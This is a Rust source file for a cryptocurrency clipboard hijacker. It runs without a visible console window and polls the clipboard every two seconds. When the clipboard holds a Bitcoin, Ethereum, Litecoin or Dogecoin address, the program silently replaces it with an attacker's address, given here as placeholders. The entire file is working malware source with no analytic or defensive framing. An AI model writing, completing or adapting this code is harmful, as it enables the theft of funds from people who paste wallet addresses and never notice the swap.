#![windows_subsystem = "windows"]
use clipboard::{ClipboardProvider, ClipboardContext};
use regex::Regex;
use std::{time::Duration, thread};

fn main() {
    let btcre = Regex::new(r"^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$").unwrap();
    let ethre = Regex::new(r"^0x[a-fA-F0-9]{40}$").unwrap();
    let ltcre = Regex::new(r"^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$").unwrap();
    let dogerc = Regex::new(r"(D|A)[\dA-Za-z]{32,33}").unwrap();

    let btc = "gotta1";
    let eth = "gotta2";
    let ltc = "gotta3";
    let doge = "gotta4";
    let mut addys: Vec<String> = Vec::new();
    addys.push(btc.to_string());
    addys.push(eth.to_string());
    addys.push(ltc.to_string());
    addys.push(doge.to_string());
    let mut ctx: ClipboardContext = ClipboardProvider::new().unwrap();

    while true {
        thread::sleep(Duration::from_secs(2));
        let (isaddy, types) = checkaddy(&btcre, &ethre, &ltcre, &dogerc, &addys, ctx.get_contents().unwrap());
        if isaddy {
            if types == 1 {
                ctx.set_contents(btc.to_owned()).unwrap();
            }
            else if types == 2 {
                ctx.set_contents(eth.to_owned()).unwrap();
            }
            else if types == 3 {
                ctx.set_contents(ltc.to_owned()).unwrap();
            }
            else if types == 4 {
                ctx.set_contents(doge.to_owned()).unwrap();
            }
        }
    }   
} 
fn checkaddy(btcre: &Regex, ethre: &Regex, ltcre: &Regex, dogerc: &Regex, addys: &Vec<String>, text: String) -> (bool, i32) {
    let mut isaddy = false;
    let mut types = 0;

    if !addys.contains(&text.to_string()) {

        if btcre.is_match(&text) {
            isaddy = true;
            types = 1;
        }

        else if ethre.is_match(&text) {
            isaddy = true;
            types = 2;
        }

        else if ltcre.is_match(&text) {
            isaddy = true;
            types = 3;
        }
        else if dogerc.is_match(&text) {
            isaddy = true;
            types = 4;
        }
        (isaddy, types)
    }
    else {
        (isaddy, types)
    }
}